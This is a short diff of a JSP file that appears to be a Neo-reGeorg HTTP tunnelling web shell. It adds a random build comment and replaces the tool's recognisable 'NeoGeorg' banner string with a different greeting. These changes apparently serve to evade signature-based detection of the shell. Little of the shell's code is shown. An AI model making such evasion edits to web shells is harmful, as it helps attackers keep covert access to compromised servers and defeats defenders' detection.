@@ -1,3 +1,4 @@
+<%-- Build: hhxgaoub --%>
 <%@page pageEncoding="UTF-8"%>
 <%!
     public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();
@@ -32,7 +33,7 @@
         new Integer(HTTPCODE),//4
         new Integer(READBUF),//5
         new Integer(MAXREADSIZE),//6
-        "NeoGeorg says, 'All seems fine'",//7
+        "PugGeorg says, 'Endpoint ready'",//7
         new Integer(BLV_L_OFFSET),//8
         new Integer(USE_REQUEST_TEMPLATE),//9
         new Integer(START_INDEX),//10
